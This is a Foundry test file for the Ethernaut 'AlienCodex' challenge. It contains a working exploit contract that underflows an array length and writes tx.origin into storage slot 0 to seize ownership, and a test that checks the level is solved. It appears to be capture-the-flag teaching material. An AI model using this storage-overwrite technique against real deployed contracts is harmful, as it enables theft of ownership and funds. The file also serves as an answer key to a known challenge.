// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {DummyFactory} from "src/levels/DummyFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

interface AlienCodex {
    function makeContact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract AlienCodexExploit {
    function exploit(address instanceAddress) public {
        AlienCodex instance = AlienCodex(instanceAddress);
        instance.makeContact();
        instance.retract();
        uint256 codexZeroIndex = uint256(keccak256(abi.encode(1)));
        instance.revise(type(uint256).max - codexZeroIndex + 1, bytes32(uint256(uint160(tx.origin))));
    }
}

contract TestAlienCodex is Test, Utils {
    Ethernaut ethernaut;
    AlienCodex instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DummyFactory factory = DummyFactory(getOldFactory("AlienCodexFactory"));
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = AlienCodex(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player, player);

        new AlienCodexExploit().exploit(address(instance));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
